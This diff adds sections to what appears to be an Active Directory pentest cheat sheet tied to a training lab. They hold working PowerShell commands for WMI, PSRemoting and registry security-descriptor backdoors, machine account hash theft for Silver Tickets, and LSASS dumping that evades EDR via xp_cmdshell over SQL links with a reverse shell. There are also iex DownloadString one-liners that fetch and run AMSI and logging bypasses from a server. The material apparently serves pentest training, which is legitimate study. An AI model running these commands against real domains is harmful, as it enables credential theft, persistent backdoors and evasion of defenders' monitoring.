@@ -1183,6 +1183,67 @@ Rubeus.exe asktgt
 
 ---
 
+## SECTION 8b: SECURITY DESCRIPTOR MODIFICATION
+
+### WMI Namespace Access via Descriptor Modification
+
+#### Prerequisites
+- Domain Admin privileges on target (for initial modification)
+- RACE.ps1 module
+
+#### Modification Steps
+```powershell
+# As DA, grant user access to WMI namespace
+. C:\AD\Tools\RACE.ps1
+Set-RemoteWMI -SamAccountName studentx 
+  -ComputerName dcorp-dc 
+  -namespace 'root\cimv2' 
+  -Verbose
+
+# New ACL allows studentx to query WMI
+```
+
+#### Exploitation (As Non-Admin User)
+```powershell
+# Now studentx can query WMI without admin privileges
+gwmi -class win32_operatingsystem -ComputerName dcorp-dc
+
+# Works for credential dumping or system reconnaissance
+```
+
+### PowerShell Remoting Access via Descriptor Modification
+
+```powershell
+# As DA, modify PSRemoting ACL
+Set-RemotePSRemoting -SamAccountName studentx 
+  -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
+  -Verbose
+
+# As studentx, now can run commands
+Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc
+```
+
+### Machine Account Hash Extraction via Registry Backdoor
+
+**Objective:** Extract machine account hash without DA privileges on DC
+
+```powershell
+# As DA, create registry backdoor allowing studentx read access
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
+  -Trustee studentx 
+  -Verbose
+
+# As studentx, now retrieve machine account hash
+. C:\AD\Tools\RACE.ps1
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc
+
+# Hash can be used for Silver Ticket attacks
+```
+
+**Use Case:** Gain WMI access without DA after descriptor modification
+
+---
+
 ## SECTION 9: PERSISTENCE MECHANISMS
 
 ### DSRM Administrator Abuse
@@ -1323,6 +1384,59 @@ C:\AD\Tools\WSManWinRM.exe eu-sqlx.domain.com
 
 # Set ASR exclusion for detection bypass:
 # Add "C:\AD\Tools" to ASR exclusion list
+```
+
+### MDE/MDI Bypass for LSASS Dumping
+
+#### Problem
+- Traditional minidump (Mimikatz/SafetyKatz) is detected by MDE
+- Memory dumping triggers behavioral analysis
+
+#### Solution: Custom API Implementation (minidumpdotnet.dll)
+
+**Why It Works:**
+- Uses custom implementation of MiniDumpWriteDump() API
+- Avoids public known signatures
+- Not chain-detected when delivered via SMB
+
+#### Delivery & Execution
+```powershell
+# Host minidumpdotnet.dll and supporting scripts on SMB share
+# \\studentvm\studentsharex\mini.ps1
+# \\studentvm\studentsharex\minidumpdotnet.dll
+# \\studentvm\studentsharex\reverse.exe
+
+# Execute via SQL link (can reach cross-forest if database links available)
+Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+  -Query 'exec master..xp_cmdshell ''xcopy \\studentvm\studentsharex\mini.ps1 C:\Users\Public''' 
+  -QueryTarget eu-sqlx
+
+# Then execute the dump script
+Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+  -Query 'exec master..xp_cmdshell ''powershell -ep bypass C:\Users\Public\mini.ps1''' 
+  -QueryTarget eu-sqlx
+
+# Execute reverse shell on attacker listener
+```
+
+#### Reverse Dump Pattern
+```
+1. Dump LSASS to file using custom API (undetected)
+2. Transfer dump file over SMB (less likely detected)
+3. Reverse/XOR the dump file before sending (added obfuscation)
+4. Parse dump locally with Mimikatz (outside protected environment)
+```
+
+**Advantage:** Avoids real-time memory scanning on source machine
+
+#### AMSI & Script Block Logging Bypass Sequence
+```powershell
+# Chain multiple bypasses before loading tools
+iex (New-Object System.NET.WebClient).DownloadString('http://server/sbloggingbypass.txt')
+iex (New-Object System.NET.WebClient).DownloadString('http://server/Amsi-Byp.txt')
+iex (New-Object System.NET.WebClient).DownloadString('http://server/PowerUpSQL.ps1')
+
+# Now use PowerUpSQL for database operations without detection
 ```
 
 ---
